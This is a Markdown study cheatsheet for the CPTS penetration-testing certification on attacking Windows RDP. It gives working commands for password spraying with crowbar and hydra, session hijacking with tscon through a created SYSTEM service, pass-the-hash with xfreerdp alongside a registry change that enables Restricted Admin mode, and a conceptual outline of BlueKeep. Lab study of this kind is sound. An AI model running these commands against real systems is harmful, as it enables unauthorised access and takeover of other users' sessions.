# RDP Attacking — CPTS Cheatsheet

## 1. RDP Basics

**Remote Desktop Protocol (RDP)** provides graphical remote access to Windows systems.

| Item                   | Value                                 |
| ---------------------- | ------------------------------------- |
| Default port           | `TCP/3389`                            |
| Service                | `ms-wbt-server`                       |
| Common clients         | `xfreerdp`, `rdesktop`                |
| Typical authentication | Username + password / NTLM / Kerberos |

Basic enumeration:

```bash
nmap -Pn -p3389 <TARGET>
```

More detailed:

```bash
nmap -Pn -p3389 -sV <TARGET>
```

---

# 2. RDP Password Attacks

RDP authentication can be attacked through password guessing or **password spraying**.

### Password spraying

Instead of:

```text
user1 → password1
user1 → password2
user1 → password3
```

Spraying does:

```text
password1 → user1
           → user2
           → user3
           → user4

password2 → user1
           → user2
           → ...
```

This reduces the chance of triggering account lockout policies.

### Crowbar

```bash
crowbar -b rdp -s <TARGET>/32 -U users.txt -c 'PASSWORD'
```

Example:

```bash
crowbar -b rdp -s 192.168.220.142/32 -U users.txt -c 'password123'
```

### Hydra

```bash
hydra -L users.txt -p 'PASSWORD' <TARGET> rdp
```

For RDP, reduce concurrency if necessary:

```bash
hydra -L users.txt -p 'PASSWORD' -t 1 <TARGET> rdp
```

**Remember:** password spraying must respect the target's lockout policy.

---

# 3. RDP Login

### xfreerdp

```bash
xfreerdp /v:<TARGET> /u:<USER> /p:'<PASSWORD>'
```

Example:

```bash
xfreerdp /v:192.168.2.143 /u:administrator /p:'password123'
```

If the certificate is self-signed/untrusted, commonly:

```bash
xfreerdp /v:<TARGET> /u:<USER> /p:'<PASSWORD>' /cert:ignore
```

### rdesktop

```bash
rdesktop -u <USER> -p '<PASSWORD>' <TARGET>
```

---

# 4. RDP Session Enumeration

Once you have access to a Windows machine, check active sessions:

```cmd
query user
```

or:

```cmd
quser
```

Example:

```text
USERNAME    SESSIONNAME    ID    STATE
juurena     rdp-tcp#13     1     Active
lewen       rdp-tcp#14     2     Active
```

Important information:

```text
USERNAME       → logged-in account
SESSIONNAME    → RDP session name
ID             → session ID
STATE          → Active / Disc / etc.
```

---

# 5. RDP Session Hijacking

### Concept

If you have sufficient privileges, particularly **SYSTEM**, you may be able to connect to another user's existing RDP session without knowing their password.

Attack chain:

```text
Local Administrator
       ↓
Obtain SYSTEM
       ↓
Enumerate RDP sessions
       ↓
Identify target SESSION ID
       ↓
tscon
       ↓
Target user's desktop
```

### Check sessions

```cmd
query user
```

Example:

```text
USERNAME    SESSIONNAME    ID
juurena     rdp-tcp#13     1
lewen       rdp-tcp#14     2
```

Target:

```text
Session ID = 2
```

### tscon

```cmd
tscon 2 /dest:rdp-tcp#13
```

General form:

```cmd
tscon <TARGET_SESSION_ID> /dest:<OUR_SESSION_NAME>
```

**Important:** This technique requires the appropriate privileges, traditionally **SYSTEM**.

---

# 6. Obtaining SYSTEM

If you already have local administrator privileges, you may have paths to SYSTEM.

The HTB example uses a Windows service:

```cmd
sc.exe create sessionhijack binpath= "cmd.exe /k tscon 2 /dest:rdp-tcp#13"
```

Then:

```cmd
net start sessionhijack
```

Why this works conceptually:

```text
Administrator
     ↓
Create Windows service
     ↓
Service runs as LocalSystem
     ↓
tscon executes with SYSTEM privileges
     ↓
Connect to target RDP session
```

**Version caveat:** The module notes this particular method no longer works on Server 2019.

---

# 7. RDP Pass-the-Hash

If you have:

```text
Username
+
NTLM hash
```

but don't know the plaintext password, RDP may still be possible through **Pass-the-Hash (PtH)** under the appropriate configuration.

Tool:

```bash
xfreerdp
```

Flag:

```text
/pth:<NT_HASH>
```

Example:

```bash
xfreerdp /v:192.168.220.152 /u:lewen /pth:300FF5E89EF33F83A8146C10F5AB9BB9
```

### Core idea

Normally:

```text
Password
   ↓
Authentication
   ↓
RDP session
```

PtH:

```text
NTLM hash
   ↓
NTLM authentication
   ↓
RDP session
```

You don't recover the plaintext password.

---

# 8. Restricted Admin Mode

RDP PtH has an important dependency:

**Restricted Admin Mode must be enabled/supported appropriately on the target.**

The HTB example enables it using:

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Then:

```bash
xfreerdp /v:<TARGET> /u:<USER> /pth:<NT_HASH>
```

### Remember the relationship

```text
NT hash available?
       ↓
User has RDP access?
       ↓
Restricted Admin configuration permits PtH?
       ↓
xfreerdp /pth
```

Not every Windows configuration will allow this.

---

# 9. BlueKeep — CVE-2019-0708

**BlueKeep** is a critical RDP vulnerability affecting vulnerable Windows versions.

```text
CVE-2019-0708
TCP/3389
RDP
Remote Code Execution
Pre-authentication
```

### Why it is dangerous

The key point is:

**Authentication is not required to trigger the vulnerable condition.**

Conceptually:

```text
Attacker
   ↓
RDP connection
   ↓
Manipulated RDP request
   ↓
Vulnerable virtual-channel handling
   ↓
Use-After-Free
   ↓
Memory corruption
   ↓
Code execution
```

Because the affected RDP service operates with high privileges, successful exploitation can result in highly privileged execution.

---

# 10. BlueKeep — Attack Mechanism

Remember the high-level flow:

### Initialization

```text
1. Attacker sends manipulated RDP initialization/request
              ↓
2. Vulnerable function processes request
              ↓
3. Virtual channel is created/handled
              ↓
4. Use-after-free condition occurs
```

### Exploitation

```text
5. Attacker-controlled data influences freed memory
              ↓
6. Kernel memory is corrupted
              ↓
7. Execution is redirected
              ↓
8. Attacker obtains code execution
```

Potential result:

```text
RDP
 ↓
Kernel-level exploitation
 ↓
LocalSystem-level execution
 ↓
Remote access
```

---

# 11. BlueKeep Important Concepts

### Use-After-Free (UAF)

A program:

```text
allocates memory
      ↓
uses memory
      ↓
frees memory
      ↓
incorrectly continues using it
```

If an attacker can influence what occupies the freed memory, they may be able to manipulate execution.

### Why BlueKeep matters

It demonstrates an important pentesting concept:

```text
Network service
      ↓
Pre-auth vulnerability
      ↓
Memory corruption
      ↓
Code execution
      ↓
High privilege
```

It isn't simply a "bad password" vulnerability.

---

# 12. RDP Enumeration Workflow

Use this order during a pentest/lab:

```text
1. Discover RDP
       ↓
2. Identify version/configuration
       ↓
3. Check for known vulnerabilities
       ↓
4. Identify valid credentials
       ↓
5. Consider password spraying carefully
       ↓
6. Log in with xfreerdp/rdesktop
       ↓
7. Enumerate Windows privileges/users
       ↓
8. Check active RDP sessions
       ↓
9. Consider session hijacking if privileged
       ↓
10. If you have NT hash → consider PtH
```

### Quick commands

```bash
# Discover RDP
nmap -Pn -p3389 <TARGET>

# Version detection
nmap -Pn -p3389 -sV <TARGET>

# Password spray
crowbar -b rdp -s <TARGET>/32 -U users.txt -c 'PASSWORD'

# Hydra
hydra -L users.txt -p 'PASSWORD' <TARGET> rdp

# RDP login
xfreerdp /v:<TARGET> /u:<USER> /p:'<PASSWORD>'

# RDP PtH
xfreerdp /v:<TARGET> /u:<USER> /pth:<NT_HASH>
```

---

# 13. What You Should Remember for CPTS

| Technique           | Prerequisite                         | Key Tool/Command   |
| ------------------- | ------------------------------------ | ------------------ |
| RDP enumeration     | Network access                       | `nmap`             |
| Password spraying   | Usernames + candidate password       | `crowbar`, `hydra` |
| RDP login           | Valid credentials                    | `xfreerdp`         |
| Session enumeration | Windows access                       | `query user`       |
| Session hijacking   | Appropriate privileged access/SYSTEM | `tscon`            |
| Pass-the-Hash       | NT hash + RDP access/configuration   | `xfreerdp /pth`    |
| BlueKeep            | Vulnerable RDP implementation        | CVE-2019-0708      |

## Mental Model

```text
                    RDP
                     │
          ┌──────────┴──────────┐
          │                     │
    Authentication          Vulnerability
          │                     │
   ┌──────┴──────┐          BlueKeep
   │             │
 Password      NT Hash
   │             │
Spraying       PtH
   │             │
   └──────┬──────┘
          │
      RDP Access
          │
   ┌──────┴──────┐
   │             │
Normal GUI    Existing Sessions
                  │
             tscon / hijack
```

### The big distinction

**Credential attack:**

```text
Get credentials/hash → authenticate → RDP
```

**Session hijacking:**

```text
Already privileged on machine → access another user's existing session
```

**BlueKeep:**

```text
No credentials → exploit vulnerable RDP → RCE
```

That distinction is the most important thing to retain from this module.
